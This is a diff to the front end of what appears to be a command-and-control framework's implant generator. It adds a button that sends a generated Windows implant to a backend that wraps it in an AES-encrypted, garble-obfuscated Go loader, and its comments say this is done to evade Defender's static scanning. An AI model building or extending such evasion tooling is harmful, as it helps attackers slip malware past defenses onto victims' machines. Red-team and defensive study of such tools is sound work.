@@ -102,6 +102,7 @@ export default function Generate() {
   const [copied,   setCopied]   = useState(false)
   const [terminal, setTerminal] = useState<TermLine[]>([])
   const [running,  setRunning]  = useState(false)
+  const [packing,  setPacking]  = useState(false)
   const [showEvasion, setShowEvasion] = useState(true)
   const termRef = useRef<HTMLDivElement>(null)
 
@@ -248,6 +249,35 @@ export default function Generate() {
   function downloadImplant() {
     if (!result?.path) return
     window.open(`/api/generate/download?path=${encodeURIComponent(result.path)}`, '_blank')
+  }
+
+  // Pack: AES-256-GCM encrypt the generated binary inside a fresh Go loader.
+  // The packed loader has zero C2 signatures — Defender sees only ciphertext.
+  async function packImplant() {
+    if (!result?.path) return
+    setPacking(true)
+    setTerminal(prev => [
+      ...prev,
+      { text: '', type: 'info' },
+      { text: '[*] Packing with AES-256-GCM loader…', type: 'info' },
+      { text: '[*] Compiling loader with garble (-literals -tiny -seed=random)…', type: 'info' },
+    ])
+    try {
+      const res = await apiPost<{ path: string; message: string }>('/api/generate/pack', {
+        binary_path:  result.path,
+        implant_name: name.trim() || 'implant',
+        is_shellcode: format === 'bin',
+      })
+      setResult(prev => prev ? { ...prev, path: res.path, message: res.message } : null)
+      setTerminal(prev => [
+        ...prev,
+        { text: `[+] Packed loader: ${res.path}`, type: 'ok' },
+        { text: `[*] ${res.message}`, type: 'info' },
+        { text: '[+] Ready to download — click ↓', type: 'ok' },
+      ])
+    } catch (e) {
+      setTerminal(prev => [...prev, { text: `[-] Pack failed: ${e}`, type: 'err' }])
+    } finally { setPacking(false) }
   }
 
   const activeFmt = formats.find(f => f.ext === format) ?? formats[0]
@@ -457,6 +487,24 @@ export default function Generate() {
                 {running ? <Loader size={12} className="animate-spin" /> : <Play size={12} />}
                 <span style={{ fontSize: 10 }}>Execute</span>
               </button>
+
+              {/* Pack: AES-encrypt implant inside fresh loader binary */}
+              {result.path && os === 'windows' && (
+                <button onClick={packImplant} disabled={packing}
+                  title="AES-256-GCM encrypt implant inside a fresh garbled loader — bypasses Defender static scan"
+                  style={{
+                    display: 'flex', alignItems: 'center', gap: 5,
+                    padding: '6px 12px', borderRadius: 4, fontSize: 10,
+                    fontFamily: 'inherit', fontWeight: 700, cursor: packing ? 'wait' : 'pointer',
+                    background: packing ? 'rgba(185,28,28,.08)' : 'rgba(185,28,28,.15)',
+                    border: '1px solid rgba(185,28,28,.5)',
+                    color: '#ef4444',
+                  }}>
+                  {packing ? <Loader size={11} className="animate-spin" /> : <Shield size={11} />}
+                  {packing ? 'Packing…' : 'Pack (AES)'}
+                </button>
+              )}
+
               <button onClick={() => { navigator.clipboard.writeText(buildCommand()); setCopied(true); setTimeout(()=>setCopied(false),1500) }}
                 className="btn btn-ghost" title="Copy command">
                 {copied ? <CheckCheck size={11} /> : <Copy size={11} />}
